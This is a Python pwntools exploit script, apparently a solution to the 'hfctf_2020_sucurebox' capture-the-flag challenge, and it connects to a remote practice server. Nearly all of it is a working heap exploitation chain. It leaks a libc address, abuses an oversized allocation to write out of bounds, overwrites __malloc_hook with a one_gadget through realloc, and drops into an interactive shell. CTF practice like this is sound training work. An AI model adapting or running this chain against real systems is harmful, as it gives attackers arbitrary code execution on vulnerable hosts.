import sys
from pwn import *
from ctypes import *
from pwn_debug.pwn_debug import *
binary='hfctf_2020_sucurebox'
elf=ELF(binary)
pdbg=pwn_debug(binary)
pdbg.local("/lib/x86_64-linux-gnu/libc.so.6")
pdbg.debug("2.27")
pdbg.remote('node3.buuoj.cn',28652)
pdbg.context.log_level='debug'
while True :
	# try :
		if len(sys.argv)==1 :
			io=pdbg.run("debug")
			# io=pdbg.run("local")
			libc=pdbg.libc
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]
			# one_gadgaet=[0x41602,0x41656,0xdef36]
		else :
			io=pdbg.run("remote")
			# libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			libc=ELF('../../x64libc/libc.so.6')
			one_gadgaet=[0x4f2c5,0x4f322,0x10a38c]
			# one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]


		def add(a):
			io.sendlineafter('5.Exit','1')
			io.sendlineafter('Size:',str(a))

		def delete(a):
			io.sendlineafter('5.Exit','2')
			io.sendlineafter('Box ID:',str(a))

		def edit(a,b,c,d):
			io.sendlineafter('5.Exit','3')
			io.sendlineafter('Box ID:',str(a))
			io.sendlineafter('Offset of msg:',str(b))
			io.sendlineafter('Len of msg: ',str(c))
			io.sendafter('Msg:',d)

		def show(a,b,c):
			io.sendlineafter('5.Exit','4')
			io.sendlineafter('Box ID:',str(a))
			io.sendlineafter('Offset of msg:',str(b))
			io.sendlineafter('Len of msg: ',str(c))

		def enc(content, key):
			value = 0

			for i in range(16):
				value |= ((content & 0xFF) ^ key[i]) << (i * 8)
				content >>= 8

			return p64(value & 0xFFFFFFFFFFFFFFFF) + p64(value >> 64)


		add(0x4f8)
		add(0x10f)
		delete(0)
		add(0x4f8)
		show(0,0,8)
		__malloc_hook_offset = libc.sym["__malloc_hook"]
		realloc_offset = libc.symbols["realloc"]
		libc_base=u64(io.recvuntil('\x7f')[-6:]+'\x00\x00')-libc.sym['__malloc_hook']-96-0x10
		libc.address=libc_base
		system_addr=libc.sym['system']
		bin_sh_addr=libc.search('/bin/sh\x00').next()
		libc_realloc = libc_base + realloc_offset
		__malloc_hook = libc_base + __malloc_hook_offset
		one_gadget = libc_base + one_gadgaet[2]


		add(0xFFFFFF00000000)

		io.recvuntil("Key: \n")
		keys = io.recv(48)
		key = []
		for i in range(0, len(keys), 3):
			print(keys[i:i+3])
			key.append(int(keys[i:i+3], 16))
		edit(2, str(__malloc_hook - 8), 16, enc(((libc_realloc + 10) << 64) | one_gadget, key))

		# __malloc_hook
		add(0x108)

		success(key)



		success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		# pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue